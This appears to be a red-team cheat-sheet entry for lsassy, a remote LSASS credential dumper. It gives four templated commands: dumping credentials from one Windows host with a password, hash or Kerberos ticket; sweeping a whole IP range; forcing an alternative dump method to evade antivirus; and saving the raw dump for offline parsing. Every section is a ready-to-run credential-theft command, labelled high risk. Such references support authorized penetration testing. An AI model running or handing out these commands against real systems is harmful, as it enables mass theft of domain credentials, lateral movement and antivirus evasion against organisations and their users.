# Lsassy
> Remote LSASS dumper: drops a dumper on the target, extracts the dump, parses it locally for credentials, and cleans up.

<!-- tags: ad,lsassy,lsass,credentials,dump,post -->

---

## dump lsass single host
Dump LSASS on a single host and parse credentials locally. Swap -p for -H {{NTHASH}} (PtH) or -k (Kerberos).

```bash
lsassy -d {{DOMAIN:domain}} -u {{USERNAME:str}} -p {{PASSWORD:str}} {{TARGET:ip}}
```

<!-- meta: risk=high | phase=post | tags=lsass,dump,creds -->

---

## dump lsass over cidr range
Sweep an IP range, dumping LSASS wherever the creds work. Auto-skips unreachable hosts.

```bash
lsassy -d {{DOMAIN:domain}} -u {{USERNAME:str}} -p {{PASSWORD:str}} {{CIDR:str:10.10.10.0/24}}
```

<!-- meta: risk=high | phase=post | tags=lsass,dump,sweep,cidr -->

---

## dump lsass force method
Force a specific dumper (comsvcs, procdump, dllinject, nanodump, etc.) when the default is blocked by AV.

```bash
lsassy -d {{DOMAIN:domain}} -u {{USERNAME:str}} -p {{PASSWORD:str}} -m {{DUMP_METHOD:str:comsvcs}} {{TARGET:ip}}
```

<!-- meta: risk=high | phase=post | tags=lsass,dump,method,av-evasion -->

---

## dump lsass keep raw dump
Save the raw LSASS dump alongside parsing - useful for offline pypykatz analysis if lsassy's parser misses something.

```bash
lsassy -d {{DOMAIN:domain}} -u {{USERNAME:str}} -p {{PASSWORD:str}} -r --dumpfile {{OUTFILE:file:lsass.dmp}} {{TARGET:ip}}
```

<!-- meta: risk=high | phase=post | tags=lsass,dump,raw,pypykatz -->
